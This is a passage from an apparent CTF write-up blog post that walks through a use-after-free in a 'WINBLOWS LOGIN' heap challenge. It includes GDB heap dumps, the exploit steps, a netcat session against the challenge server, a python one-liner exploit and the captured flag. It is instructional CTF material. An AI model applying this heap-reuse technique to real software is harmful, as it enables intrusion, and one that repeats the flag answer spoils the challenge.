</code></pre></div>
<p>Notice that I examined a few bytes before the match to watch the whole structure and the chunk metadata (<code>0x41</code>), which means that the whole chunk has <code>0x40</code> (or 64) bytes reserved and the previous chunk is in use (<code>0x41</code> end in <code>1</code>).</p>
<p>Now we can call <code>free</code> by signing out (2):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 2
You have been successfully logged out.

Breakpoint 1, <span class=code-dark-blue>0x0000555555400a1e</span> in <span class=code-dark-yellow>menu</span> ()  
</code></pre></div>
<p>If we check again the heap, we will notice some differences:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/20x 0x555555603290
<span class=code-dark-blue>0x555555603290</span>: 0x00000000      0x00000000      0x00000041      0x00000000  
<span class=code-dark-blue>0x5555556032a0</span>: 0x00000000      0x00000000      0x55603010      0x00005555
<span class=code-dark-blue>0x5555556032b0</span>: 0x43434343      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032c0</span>: 0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032d0</span>: 0x00000000      0x00000000      0x00020d31      0x00000000
</code></pre></div>
<p>Now, the username has been overwritten with the address of the previous chunk.</p>
<p>Let&rsquo;s see what happens if we enter a <code>fake_flag</code> using <code>strdup</code> (3) with a small length:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 3
You are not admin. Would you like to create a new flag instead?  
EEEE
Here's your flag: EEEE
Breakpoint 1, <span class=code-dark-blue>0x0000555555400a1e</span> in <span class=code-dark-yellow>menu</span> ()
</code></pre></div>
<p>This is the heap at this point:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/28x 0x555555603290
<span class=code-dark-blue>0x555555603290</span>: 0x00000000      0x00000000      0x00000041      0x00000000  
<span class=code-dark-blue>0x5555556032a0</span>: 0x00000000      0x00000000      0x55603010      0x00005555
<span class=code-dark-blue>0x5555556032b0</span>: 0x43434343      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032c0</span>: 0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032d0</span>: 0x00000000      0x00000000      0x00000021      0x00000000
<span class=code-dark-blue>0x5555556032e0</span>: 0x45454545      0x0000000a      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032f0</span>: 0x00000000      0x00000000      0x00020d11      0x00000000
</code></pre></div>
<p>We can see that <code>EEEE</code> (and new line character) was stored on the heap in another chunk (size <code>0x20</code>, 32). The function <code>strdup</code> will reserve enough memory to store the actual length of the string (the nearest multiple of 16 greater than or equal to the actual size). Notice that we have 16 bytes for the chunk metadata and 5 bytes for the string, so the nearest multiple of 16 is 32.</p>
<p>The Use After Free vulnerability comes when <code>malloc</code> finds a recently released chunk, and this happens if <code>malloc</code> needs to allocate the same amount of bytes that the released chunk had. Hence, if we enter a <code>fake_flag</code> that has enough length, its chunk metadata will be <code>0x41</code> and therefore <code>malloc</code> will reuse the released chunk.</p>
<p>We can repeat the previous process until entering the <code>fake_flag</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 3
You are not admin. Would you like to create a new flag instead?
EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
Here's your flag: EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE  
Breakpoint 1, <span class=code-dark-blue>0x0000555555400a1e</span> in <span class=code-dark-yellow>menu</span> ()
</code></pre></div>
<p>We have entered 48 characters. This is the heap now:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/28x 0x555555603290
<span class=code-dark-blue>0x555555603290</span>: 0x00000000      0x00000000      0x00000041      0x00000000  
<span class=code-dark-blue>0x5555556032a0</span>: 0x45454545      0x45454545      0x45454545      0x45454545
<span class=code-dark-blue>0x5555556032b0</span>: 0x45454545      0x45454545      0x45454545      0x45454545
<span class=code-dark-blue>0x5555556032c0</span>: 0x45454545      0x45454545      0x45454545      0x45454545
<span class=code-dark-blue>0x5555556032d0</span>: 0x0000000a      0x00000000      0x00020d31      0x00000000
<span class=code-dark-blue>0x5555556032e0</span>: 0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0x5555556032f0</span>: 0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>At this moment, if there was a user structure in that heap chunk, it would have an attribute <code>admin != 0</code>, so we could read the real flag.</p>
<p>Nevertheless, when the pointer <code>curr</code> is freed, it is also set to <code>NULL</code>. Fortunately, we have the option to backup the current pointer into <code>save</code> and afterwards recover the same pointer, so that we get what we want.</p>
<p>So, this will be the exploiting process:</p>
<ol>
<li>Login as any user using <code>malloc</code> (1)</li>
<li>Backup <code>curr</code> into <code>save</code> (4)</li>
<li>Log out to call <code>free</code> (2)</li>
<li>Enter a <code>fake_flag</code> with 48 bytes length (3)</li>
<li>Restore <code>save</code> into <code>curr</code> (5)</li>
<li>Print the real flag (3)</li>
</ol>
<p>Let&rsquo;s do it directly on server side:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> thekidofarcrania.com 13226
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 1
Username: user
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 4
User has been locked now.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 2
You have been successfully logged out.
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 3
You are not admin. Would you like to create a new flag instead?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Here's your flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 5
Welcome back, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
!
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; 3
Here's your flag:
CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
&gt; ^C
</code></pre></div>
<p>And using a &ldquo;one-liner&rdquo;, we can extract just the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print("\n".join(["1", "user", "4", "2", "3", "A" * 48, "5", "3"]))'</span> | <span class=code-dark-green>timeout</span> 1 nc thekidofarcrania.com 13226 | <span class=code-dark-green>grep</span> CTFlearn  
<span class=code-red>CTFlearn</span>{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>